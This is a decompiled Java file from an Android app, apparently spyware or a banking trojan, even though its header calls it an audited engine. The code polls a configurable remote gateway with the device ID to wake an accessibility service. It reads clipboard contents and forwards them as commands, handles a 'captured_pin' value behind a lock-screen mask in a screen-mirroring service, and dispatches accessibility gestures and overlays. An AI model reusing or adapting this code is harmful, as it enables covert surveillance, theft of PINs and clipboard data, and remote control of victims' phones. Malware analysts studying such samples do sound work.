// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package a2;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import d2.y;
import e2.n0;
import e2.q0;
import e2.w;
import e2.w0;
import e2.x0;
import e2.z;
import e2.z1;
import f2.k0;
import g2.a0;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import lyr.stable.runtime.BqqSNkWB;
import lyr.stable.runtime.ScreenMirrorService;
import lyr.stable.runtime.engine.EngineService;
import org.json.JSONObject;
import w1.a4;
import w1.b1;
import w1.d5;
import w1.e2;
import w1.f5;
import w1.j3;
import w1.j5;
import w1.k6;
import w1.p4;
import w1.pa;
import w1.r4;
import w1.s2;
import w1.s8;
import w1.t2;
import w1.t9;
import w1.w5;
import w1.x;
import w1.x5;
import w1.y5;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class h implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f102c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ Object f103d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ Object f104e;

    public /* synthetic */ h(Object obj, Object obj2, int i3) {
        this.f102c = i3;
        this.f103d = obj;
        this.f104e = obj2;
    }

    private final void a() {
        z1 z1VarB;
        boolean z2;
        boolean z3;
        boolean z4;
        x0 x0Var = (x0) this.f103d;
        w0 w0Var = (w0) this.f104e;
        while (true) {
            w0 w0Var2 = w0Var;
            if (w0Var2 == null) {
                x0Var.getClass();
                return;
            }
            long jLongValue = ((Number) x0Var.f1075d.d()).longValue();
            try {
                synchronized (x0Var.f1077f) {
                    try {
                        z4 = !x0Var.f1081j && x0Var.f1078g == w0Var2.f1068e && x0Var.a(w0Var2.f1064a);
                    } catch (Throwable th) {
                        throw th;
                    }
                }
                z1VarB = z4 ? x0Var.f1073b.b(w0Var2.f1064a, w0Var2.f1065b, Long.valueOf(w0Var2.f1066c)) : null;
                w0Var2.f1064a.b();
            } catch (Throwable unused) {
                w0Var2.f1064a.b();
                z1VarB = null;
            }
            long jLongValue2 = ((Number) x0Var.f1075d.d()).longValue();
            synchronized (x0Var.f1077f) {
                z2 = !x0Var.f1081j && x0Var.f1078g == w0Var2.f1068e && x0Var.a(w0Var2.f1064a);
            }
            synchronized (x0Var.f1077f) {
                boolean zA = x0Var.a(w0Var2.f1064a);
                z3 = !zA;
                if (!zA) {
                    x0Var.f1084m++;
                }
            }
            long j3 = w0Var2.f1066c;
            e2.f fVar = w0Var2.f1064a;
            e2.b bVar = fVar.f792f;
            long j4 = fVar.f793g;
            long j5 = w0Var2.f1067d;
            try {
                x0Var.f1076e.f(new w(j3, jLongValue <= j5 ? 0L : (jLongValue - j5) / 1000000, jLongValue2 > jLongValue ? (jLongValue2 - jLongValue) / 1000000 : 0L, z1VarB != null, bVar, j4, z2 && z1VarB != null, z3));
            } catch (Throwable unused2) {
            }
            if (z2 && z1VarB != null) {
                try {
                    z zVar = x0Var.f1074c;
                    e2.f fVar2 = w0Var2.f1064a;
                    zVar.f(new n0(z1VarB, fVar2.f792f, fVar2.f793g));
                } catch (Throwable unused3) {
                }
            }
            synchronized (x0Var.f1077f) {
                try {
                    if (x0Var.f1081j) {
                        x0Var.f1079h = false;
                        w0Var = null;
                    } else {
                        w0Var = x0Var.f1080i;
                        x0Var.f1080i = null;
                        if (w0Var == null) {
                            x0Var.f1079h = false;
                        }
                    }
                } catch (Throwable th2) {
                    throw th2;
                }
            }
        }
    }

    private final void b() {
        w1.v vVar = (w1.v) this.f103d;
        x xVar = (x) this.f104e;
        synchronized (xVar.f5463c) {
            try {
                w1.t tVar = (w1.t) vVar.f5274e.pollFirst();
                if (tVar == null) {
                    vVar.f5276g = false;
                    xVar.f5463c.notifyAll();
                    return;
                }
                vVar.f5281l = Math.max(vVar.f5281l, x.M(Math.max(0L, System.nanoTime() - tVar.f5117i)));
                long jNanoTime = System.nanoTime();
                try {
                    if (!xVar.z(vVar, tVar)) {
                        xVar.A(vVar);
                        tVar.b();
                    } else if (vVar.f5270a) {
                        xVar.H(tVar);
                    } else {
                        xVar.G(tVar);
                    }
                    xVar.J(vVar, jNanoTime);
                    ArrayList arrayList = new ArrayList();
                    synchronized (xVar.f5463c) {
                        try {
                            xVar.C(vVar, tVar);
                            if (xVar.f5480u) {
                                xVar.w(vVar, arrayList);
                                vVar.f5276g = false;
                            } else if (vVar.f5274e.isEmpty()) {
                                vVar.f5276g = false;
                            } else if (!x.F(vVar)) {
                                xVar.w(vVar, arrayList);
                                vVar.f5276g = false;
                            }
                            xVar.f5463c.notifyAll();
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                    x.K(arrayList);
                } catch (Throwable th2) {
                    try {
                        StringBuilder sb = new StringBuilder();
                        sb.append(vVar.f5270a ? "critical" : "collection");
                        sb.append(" drain failed sequence=");
                        sb.append(tVar.f5118j);
                        Log.e("A11yEventPipeline", sb.toString(), th2);
                        xVar.B(vVar);
                        tVar.b();
                        xVar.J(vVar, jNanoTime);
                        ArrayList arrayList2 = new ArrayList();
                        synchronized (xVar.f5463c) {
                            try {
                                xVar.C(vVar, tVar);
                                if (xVar.f5480u) {
                                    xVar.w(vVar, arrayList2);
                                    vVar.f5276g = false;
                                } else if (vVar.f5274e.isEmpty()) {
                                    vVar.f5276g = false;
                                } else if (!x.F(vVar)) {
                                    xVar.w(vVar, arrayList2);
                                    vVar.f5276g = false;
                                }
                                xVar.f5463c.notifyAll();
                                x.K(arrayList2);
                            } catch (Throwable th3) {
                                throw th3;
                            }
                        }
                    } catch (Throwable th4) {
                        xVar.J(vVar, jNanoTime);
                        ArrayList arrayList3 = new ArrayList();
                        synchronized (xVar.f5463c) {
                            try {
                                xVar.C(vVar, tVar);
                                if (xVar.f5480u) {
                                    xVar.w(vVar, arrayList3);
                                    vVar.f5276g = false;
                                } else if (vVar.f5274e.isEmpty()) {
                                    vVar.f5276g = false;
                                } else if (!x.F(vVar)) {
                                    xVar.w(vVar, arrayList3);
                                    vVar.f5276g = false;
                                }
                                xVar.f5463c.notifyAll();
                                x.K(arrayList3);
                                throw th4;
                            } catch (Throwable th5) {
                                throw th5;
                            }
                        }
                    }
                }
            } catch (Throwable th6) {
                throw th6;
            }
        }
    }

    /* JADX WARN: Code duplicated, block: B:182:0x0396  */
    @Override // java.lang.Runnable
    public final void run() {
        String string;
        boolean zOptBoolean;
        ClipData primaryClip;
        q0 q0Var;
        Handler handler;
        HttpURLConnection httpURLConnection = null;
        String string2 = null;
        boolean z2 = true;
        char c3 = 1;
        int i3 = 0;
        switch (this.f102c) {
            case 0:
                EngineService engineService = (EngineService) this.f103d;
                Handler handler2 = (Handler) this.f104e;
                boolean z3 = EngineService.f2589l;
                w1.m mVarC = w1.m.c(engineService);
                mVarC.getClass();
                mVarC.f(9, w1.n.r());
                handler2.postDelayed(new g(engineService, c3 == true ? 1 : 0), 400L);
                return;
            case 1:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.f103d;
                a0.j jVar = (a0.j) this.f104e;
                synchronized (constraintTrackingWorker.f243f) {
                    try {
                        boolean z4 = constraintTrackingWorker.f244g;
                        a0.l lVar = constraintTrackingWorker.f245h;
                        if (z4) {
                            lVar.getClass();
                            String str = c0.a.f396a;
                            lVar.i(new p.i());
                        } else {
                            lVar.k(jVar);
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                }
                return;
            case 2:
                c2.f fVar = (c2.f) this.f103d;
                AccessibilityService accessibilityService = (AccessibilityService) this.f104e;
                String string3 = "";
                if (accessibilityService != null) {
                    Context applicationContext = accessibilityService.getApplicationContext();
                    if (applicationContext == null) {
                        applicationContext = accessibilityService;
                    }
                    String strN = c2.u.n(applicationContext, "deviceId");
                    if (strN.isEmpty()) {
                        zOptBoolean = false;
                    } else {
                        String strA = a4.a(c2.u.n(applicationContext, "gatewayUrl"));
                        if (strA == null || strA.isEmpty()) {
                            strA = t9.f5176g;
                        }
                        String strA2 = a4.a(strA);
                        if (strA2 == null) {
                            string = "";
                        } else {
                            try {
                                URI uriCreate = URI.create(strA2);
                                string = new URI("https", null, uriCreate.getHost(), uriCreate.getPort(), null, null, null).toString();
                            } catch (Throwable unused) {
                                string = "";
                            }
                        }
                        if (string.isEmpty()) {
                            zOptBoolean = false;
                        } else {
                            try {
                                HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(string.concat("/api/runtime/wake-poll")).openConnection();
                                try {
                                    httpURLConnection2.setRequestMethod("POST");
                                    httpURLConnection2.setConnectTimeout(4000);
                                    httpURLConnection2.setReadTimeout(4000);
                                    httpURLConnection2.setDoOutput(true);
                                    httpURLConnection2.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                                    byte[] bytes = new JSONObject().put("deviceId", strN).toString().getBytes(StandardCharsets.UTF_8);
                                    httpURLConnection2.setFixedLengthStreamingMode(bytes.length);
                                    OutputStream outputStream = httpURLConnection2.getOutputStream();
                                    outputStream.write(bytes);
                                    outputStream.flush();
                                    int responseCode = httpURLConnection2.getResponseCode();
                                    InputStream errorStream = (responseCode < 200 || responseCode >= 300) ? httpURLConnection2.getErrorStream() : httpURLConnection2.getInputStream();
                                    if (errorStream != null) {
                                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                        byte[] bArr = new byte[256];
                                        while (true) {
                                            int i4 = errorStream.read(bArr);
                                            if (i4 > 0) {
                                                byteArrayOutputStream.write(bArr, 0, i4);
                                            } else {
                                                string3 = byteArrayOutputStream.toString("UTF-8");
                                            }
                                        }
                                    }
                                    if (responseCode < 200 || responseCode >= 300) {
                                        Log.w("A11yHealth", "wake-poll http=" + responseCode);
                                        httpURLConnection2.disconnect();
                                        zOptBoolean = false;
                                    } else {
                                        zOptBoolean = new JSONObject(string3).optBoolean("wake", false);
                                        httpURLConnection2.disconnect();
                                    }
                                } catch (Throwable th2) {
                                    th = th2;
                                    httpURLConnection = httpURLConnection2;
                                    try {
                                        Log.w("A11yHealth", "wake-poll failed: " + th.getMessage());
                                        if (httpURLConnection != null) {
                                            httpURLConnection.disconnect();
                                        }
                                    } catch (Throwable th3) {
                                        if (httpURLConnection != null) {
                                            httpURLConnection.disconnect();
                                        }
                                        throw th3;
                                    }
                                }
                            } catch (Throwable th4) {
                                th = th4;
                            }
                        }
                    }
                    break;
                } else {
                    zOptBoolean = false;
                }
                if (zOptBoolean) {
                    fVar.f414a.post(new c2.d(accessibilityService, i3));
                    return;
                }
                return;
            case 3:
                d2.v vVar = (d2.v) this.f103d;
                ThreadPoolExecutor threadPoolExecutor = vVar.f628f;
                try {
                    for (d2.u uVar : (Set) this.f104e) {
                        try {
                            try {
                                Objects.requireNonNull(uVar);
                                threadPoolExecutor.execute(new d2.p(uVar, i3));
                            } catch (RuntimeException unused2) {
                            }
                        } catch (RuntimeException unused3) {
                            d2.s sVar = vVar.f627e;
                            Objects.requireNonNull(uVar);
                            sVar.b(new d2.p(uVar, i3));
                        }
                        break;
                    }
                    if (threadPoolExecutor != null) {
                        return;
                    } else {
                        return;
                    }
                } finally {
                    if (threadPoolExecutor != null) {
                        threadPoolExecutor.allowCoreThreadTimeOut(true);
                    }
                }
            case 4:
                d2.s sVar2 = (d2.s) this.f103d;
                h hVar = (h) this.f104e;
                Semaphore semaphore = sVar2.f610b;
                try {
                    hVar.run();
                    return;
                } finally {
                    semaphore.release();
                }
            case 5:
                a();
                return;
            case 6:
                try {
                    Toast.makeText(((f2.d) this.f103d).f1162a, (String) this.f104e, 1).show();
                    return;
                } catch (Throwable unused4) {
                    return;
                }
            case 7:
                f2.r rVar = (f2.r) this.f103d;
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) this.f104e;
                rVar.f1319i = false;
                try {
                    rVar.c(accessibilityEvent);
                    try {
                        return;
                    } catch (Throwable unused5) {
                        return;
                    }
                } finally {
                    try {
                        accessibilityEvent.recycle();
                        break;
                    } catch (Throwable unused6) {
                    }
                }
            case 8:
                k0.e((AccessibilityService) this.f103d, (GestureDescription) this.f104e);
                return;
            case 9:
                a0 a0Var = (a0) this.f103d;
                g2.w wVar = (g2.w) this.f104e;
                if (a0Var.G(wVar)) {
                    wVar.f1773b.d(wVar.f1774c, wVar.f1775d, new IOException("Socket.IO logical stream data ACK timed out"));
                    return;
                }
                return;
            case 10:
                ((q.h) this.f103d).b((y.j) this.f104e, false);
                return;
            case 11:
                q.u uVar2 = (q.u) this.f103d;
                a0.j jVar2 = (a0.j) this.f104e;
                if (uVar2.f3100r.f32c instanceof a0.b) {
                    jVar2.cancel(true);
                    return;
                }
                return;
            case 12:
                List<v.b> list = (List) this.f103d;
                w.e eVar = (w.e) this.f104e;
                for (v.b bVar : list) {
                    Object obj = eVar.f3365e;
                    bVar.f3271d = obj;
                    bVar.d(bVar.f3272e, obj);
                }
                return;
            case 13:
                w1.m mVar = (w1.m) this.f103d;
                w1.l lVar2 = (w1.l) this.f104e;
                if (mVar.f4484f == null || !mVar.g(lVar2)) {
                    ArrayDeque arrayDeque = mVar.f4481c;
                    if (arrayDeque.size() >= 64) {
                        arrayDeque.removeFirst();
                        Log.w("A11yBridgeClient", "pending queue full; dropped oldest command");
                    }
                    arrayDeque.addLast(lVar2);
                    mVar.a();
                    return;
                }
                return;
            case 14:
                w1.k kVar = (w1.k) this.f103d;
                IBinder iBinder = (IBinder) this.f104e;
                w1.m mVar2 = kVar.f4378a;
                mVar2.f4486h = false;
                mVar2.f4485g = iBinder;
                mVar2.f4484f = new Messenger(iBinder);
                mVar2.f4487i = 250L;
                try {
                    iBinder.linkToDeath(mVar2.f4483e, 0);
                    ArrayDeque arrayDeque2 = mVar2.f4481c;
                    while (mVar2.f4484f != null && !arrayDeque2.isEmpty()) {
                        w1.l lVar3 = (w1.l) arrayDeque2.removeFirst();
                        if (!mVar2.g(lVar3)) {
                            arrayDeque2.addFirst(lVar3);
                            return;
                        }
                    }
                    return;
                } catch (RemoteException unused7) {
                    mVar2.d("link_dead");
                    return;
                }
            case 15:
                b();
                return;
            case 16:
                BqqSNkWB bqqSNkWB = (BqqSNkWB) this.f103d;
                Context context = (Context) this.f104e;
                int i5 = BqqSNkWB.f2435f;
                try {
                    ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService("clipboard");
                    if (clipboardManager != null && clipboardManager.hasPrimaryClip() && (primaryClip = clipboardManager.getPrimaryClip()) != null && primaryClip.getItemCount() > 0) {
                        ClipData.Item itemAt = primaryClip.getItemAt(0);
                        CharSequence text = itemAt.getText();
                        Uri uri = itemAt.getUri();
                        if (uri != null) {
                            string2 = BqqSNkWB.a(context.getContentResolver(), uri);
                        } else if (text != null) {
                            string2 = text.toString();
                        }
                        if (string2 != null) {
                            w1.m mVarC2 = w1.m.c(context);
                            mVarC2.getClass();
                            mVarC2.f(13, w1.n.y0(string2));
                        }
                    }
                    break;
                } catch (Throwable th5) {
                    try {
                        Log.w("BqqSNkWB", "clipboard read fail: " + th5.getMessage());
                    } finally {
                        bqqSNkWB.b();
                    }
                    break;
                }
                return;
            case 17:
                ((e2) this.f103d).s(((d2.t) this.f104e).f612c);
                return;
            case 18:
                ((t2) this.f103d).h((s2) this.f104e, 5, 15);
                return;
            case 19:
                r4 r4Var = (r4) this.f103d;
                ScreenMirrorService screenMirrorService = (ScreenMirrorService) this.f104e;
                try {
                    b1 b1VarB = b1.b(screenMirrorService);
                    p4 p4VarF = b1VarB.f(r4Var.f4979c);
                    if (p4VarF == null || !p4VarF.b()) {
                        r4Var.f4979c = null;
                        return;
                    } else {
                        r4Var.e(screenMirrorService, b1VarB, p4VarF);
                        return;
                    }
                } catch (Throwable unused8) {
                    return;
                }
            case 20:
                j5 j5Var = (j5) this.f103d;
                f5 f5Var = (f5) j5Var.f4307a.get((String) this.f104e);
                if (f5Var == null || (q0Var = f5Var.f4002k) == null || (handler = j5Var.f4318l.f3874b) == null) {
                    return;
                }
                handler.removeCallbacks(q0Var);
                return;
            case 21:
                ((d5) this.f103d).c((y.e) this.f104e);
                return;
            case 22:
                j5 j5Var2 = (j5) this.f103d;
                j3 j3Var = (j3) this.f104e;
                long j3 = j3Var.f4305b;
                j5Var2.getClass();
                long jCurrentTimeMillis = System.currentTimeMillis();
                y yVar = j5Var2.f4309c;
                if (yVar.b(jCurrentTimeMillis) && j3 != j5Var2.f4322q && j5Var2.f4323r && jCurrentTimeMillis - j5Var2.f4324s <= 600) {
                    yVar.e(j3Var.f4304a.charAt(0), jCurrentTimeMillis);
                    j5Var2.f4322q = j3;
                    j5Var2.f4323r = false;
                    return;
                }
                return;
            case 23:
                ((HashSet) ((y.e) this.f103d).f5977d).remove((g0.j) this.f104e);
                return;
            case 24:
                y5 y5Var = (y5) this.f103d;
                String str2 = (String) this.f104e;
                w5 w5Var = y5Var.f5598f;
                if (w5Var != null) {
                    p2.a0 a0Var2 = (p2.a0) w5Var;
                    ScreenMirrorService screenMirrorService2 = (ScreenMirrorService) a0Var2.f2875b;
                    ScreenMirrorService.j(a0Var2.f2874a, str2, screenMirrorService2);
                    screenMirrorService2.getSharedPreferences("captured_pin", 0).edit().putBoolean("lock_mask_active", false).apply();
                    if (Looper.myLooper() == Looper.getMainLooper()) {
                        screenMirrorService2.O5();
                        return;
                    } else {
                        screenMirrorService2.f2475a2.post(new pa(screenMirrorService2, 14));
                        return;
                    }
                }
                return;
            case 25:
                x5 x5Var = (x5) this.f103d;
                String str3 = (String) this.f104e;
                x5Var.f5496d.clear();
                x5Var.invalidate();
                ((y5) x5Var.f5500h.f603d).e(str3);
                return;
            case 26:
                k6 k6Var = (k6) this.f103d;
                Runnable runnable = (Runnable) this.f104e;
                if (k6Var.f4397b.get()) {
                    try {
                        runnable.run();
                        return;
                    } catch (Throwable th6) {
                        k6Var.b(th6);
                        return;
                    }
                }
                return;
            case 27:
                Context context2 = (Context) this.f103d;
                Context context3 = (Context) this.f104e;
                if (context2 == null) {
                    context2 = context3;
                }
                s8.d(context2);
                return;
            case 28:
                LinearLayout linearLayout = (LinearLayout) this.f103d;
                LinearLayout linearLayout2 = (LinearLayout) this.f104e;
                linearLayout.animate().alpha(1.0f).setDuration(180L).start();
                linearLayout2.animate().scaleX(1.0f).scaleY(1.0f).setDuration(180L).start();
                return;
            default:
                AccessibilityService accessibilityService2 = (AccessibilityService) this.f103d;
                View view = (View) this.f104e;
                try {
                    WindowManager windowManager = (WindowManager) accessibilityService2.getSystemService(WindowManager.class);
                    if (windowManager == null || !view.isAttachedToWindow()) {
                        return;
                    }
                    windowManager.removeView(view);
                    return;
                } catch (Throwable th7) {
                    a0.a.p(th7, new StringBuilder("remove reminder failed: "), "ReminderOverlay");
                    return;
                }
        }
    }
}
